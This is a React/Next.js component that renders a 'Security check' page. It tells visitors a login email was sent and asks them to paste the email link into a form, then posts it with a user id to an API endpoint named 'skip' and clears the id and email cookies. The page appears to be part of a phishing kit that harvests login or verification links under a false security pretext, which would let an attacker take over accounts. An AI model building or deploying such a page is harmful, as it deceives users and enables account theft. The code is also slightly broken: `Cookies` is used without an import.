import { Field, Form, Formik } from "formik";
import { API_URL } from "../config";
import { useRouter } from "next/router";
import { toast } from "react-toastify";

function Security({ id, email }) {
  const router = useRouter();

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);

    // const { skipcode } = values;
    // Cookies.set("skipcode", skipcode);
    // router.push("/account/email");
    // return;

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      // toast.success("Login Succecssfull");
      formik.resetForm();
      console.log("success", data);
      toast.success("Login Succecssfull");
      Cookies.remove("id");
      Cookies.remove("email");
      // router.push("/account/email");
      // Cookies.remove("id");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="container px-4 lg:px-0">
      <div className="pt-[14px] lg:pt-[18px] py-[38px] text-custom-gray2">
        <h1 className="text-[27px]">Security check</h1>
        <div className="mt-[8px] space-y-[22px]">
          <p className="">
            We have upgraded our security to protect all users against account
            takeovers and hacking.
          </p>
          <p className="">
            {/* {`A security code has been sent to your address ${email}  I
            don't have access to this email account`} */}
            {`To complete this login, an Email has been sent to your address ${email}. `}
            <span className="text-xs text-custom- underline">
              I don't have access to this email account
            </span>
          </p>

          <p className="">Please enter this email link:</p>

          <div className="">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="flex gap-5">
                  <div className="">
                    <Field
                      className="lg:w-[470px] text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                      placeholder="Please copy and then paste this link into a from (a bar) on a web page:"
                      name="skipcode"
                      type="text"
                      required
                    />
                  </div>
                  <button
                    type="submit"
                    className=" bg-custom-cyan hover:bg-custom-cyan2 px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
                  >
                    Submit
                  </button>
                </Form>
              )}
            </Formik>
          </div>

          <p className="">The email you received is good for 30 minutes.</p>
          <p className="">
            It may take the code up to 10 minutes to arrive. Make sure to check
            your Spam/Junk/Trash folder.
          </p>

          <div className="flex gap-9 text-custom-rose">
            <p className="cursor-pointer hover:text-custom-rose2 underline">
              Resend the code
            </p>
            <p className="cursor-pointer hover:text-custom-rose2 underline">
              I don't have access to this email account
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Security;
